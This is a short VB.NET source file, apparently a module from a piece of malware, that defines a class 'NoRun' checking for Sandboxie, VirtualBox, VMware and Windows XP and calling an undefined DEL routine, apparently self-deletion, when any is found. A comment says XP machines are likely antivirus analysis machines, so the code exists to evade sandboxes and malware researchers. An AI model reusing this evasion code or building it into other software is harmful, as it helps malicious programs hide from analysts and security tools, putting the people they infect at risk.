Public Class NoRun

    Public Sub RUN_CHECK()
        Call AN_VM()
        Call AN_SB()
        Call AN_VB()
        Call AN_XP()
    End Sub

    Private Sub AN_SB()
        If Process.GetProcessesByName("SbieSvc").Length >= 1 Then
            DEL()
        End If
    End Sub

    Private Sub AN_VB()
        If Process.GetProcessesByName("VBoxservice").Length >= 1 OrElse IO.File.Exists(Environment.GetEnvironmentVariable("windir") & "\vboxmrxnp.dll") Then
            DEL()
        End If
    End Sub

    Private Sub AN_VM()
        If Process.GetProcessesByName("vmwareservice").Length >= 1 OrElse IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) & "\vmGuestLib.dll") Then
            DEL()
        End If
    End Sub

    Private Sub AN_XP() 'most xp machines are anti virus's machines
        If GOS.ToString.Contains("XP") Then
            DEL()
        End If
    End Sub

End Class
